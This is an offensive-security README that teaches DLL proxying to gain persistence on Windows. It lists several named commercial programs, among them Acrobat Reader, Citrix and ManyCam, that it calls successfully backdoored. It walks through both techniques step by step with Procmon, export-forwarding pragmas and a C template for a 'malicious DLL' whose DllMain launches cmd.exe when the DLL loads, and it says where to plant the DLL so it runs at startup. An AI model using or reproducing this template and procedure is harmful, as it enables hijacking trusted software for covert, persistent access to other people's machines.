# DLL Proxying
This README file will cover two techniques to perform DLL Proxying.

[This article](https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence) gives more details about the concept of DLL Proxying.

## List of successfully backdoored programs (so far)

Program Name | DLL | Requires admin rights
-------------| ----|----------------------
Lightshot | DXGIODScreenshot.dll | Yes
Acrobat Reader | BIB.dll | Yes
Hamachi Service | LMIGuardianDll.dll | Yes
ManyCam | P7x32.dll | Yes
Citrix | ctxmui.dll | Yes

## DLL Proxying & Persistence concept
The goal is to use programs that automatically run on startup.

There are two techniques, generally if the first one fails you will want to try the other one.

The two common steps for both techniques are :
1. Find the program that fits your needs for persistence
2. List DLLs used by this program (with Procmon)

### **Technique 1**

Technique 1 is based on the idea that the DLL exists, and is loaded by the program. 

In Procmon, you can check this with the **Result** column being set to **SUCCESS**.

3. Once you picked your working DLL, use a tool such as DLLExportViewer to export the legit DLL's functions 

(or use my script to automate this step and step 4)

4. Write the pragma comment linkers from the exported functions for you to implement into your malicious DLL

It should look like :

```C
#pragma comment(linker,"/export:FUNCTION_NAME=DLLFileName_orig.FUNCTION_NAME,@ORDINAL")
```

5. Create your DLL with the code that you want to execute, here's an example :

```C
#pragma once

// Add the generated comments here
// # pragma comment(linker,"/export:FUNCTION_NAME=DLLFileName_orig.FUNCTION_NAME,@ORDINAL")
// .....
#include <windows.h>

DWORD WINAPI payload() {
	STARTUPINFOA info = { 0 };

	PROCESS_INFORMATION processInfo = { 0 };

	LPSTR arguments = (char*)" /c notepad"; // This is not necessary. It's just an argument example for you to use with your own commands

	if (CreateProcessA("C:\\Windows\\System32\\cmd.exe", arguments, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo)) {
		WaitForSingleObject(processInfo.hProcess, INFINITE);
		CloseHandle(processInfo.hProcess);
		CloseHandle(processInfo.hThread);
	}
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		payload();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```

6. Name your DLL with the original legitimate DLL name (without the \_orig), and place it in the same folder.
7. Start the program and see if it worked.

### **Technique 2**

Technique 2 is based on the idea that the DLL doesn't exist where the program calls it. 

In Procmon, you can check this with the **Result** column being set to **NAME NOT FOUND**.

Using Procmon, you should also check if the **Path** column matches with the location of the installation folder of the program

3. Look for the DLL inside the System32 folder
4. Generate the pragma comment linkers from that DLL, but this time for the function name, specify entire path like such :

```C
#pragma comment(linker,"/export:FUNCTION_NAME=C:\\Windows\\System32\\FILENAME.dll.FUNCTION_NAME,@ORDINAL")
```
In my script you can use the `--system32` option to do it automatically.

6. Add the generated comments to your malicious DLL and build it
7. Place the DLL within the folder specified by the **Path** column on Procmon (where the DLL wasn't found)
8. Be sure names match (case sensitive)
9. Start the program and see if it worked

## Consequences

Now everytime the program is going to run, assuming you have chosen a correct DLL and that your own DLL is working, it is going to call your malicious DLL, and will continue to work since your DLL exports all the same functions that the legit DLL exports.

As the targeted program runs on startup, your DLL will also be called on startup and persistence is achieved.


### Troubleshoot
There are two main problems that can occur with this technique:
1. The program didn't start properly or crashed
2. The program started but nothing happened

For both case, it means that you picked the wrong DLL, and that you have to try with another one.
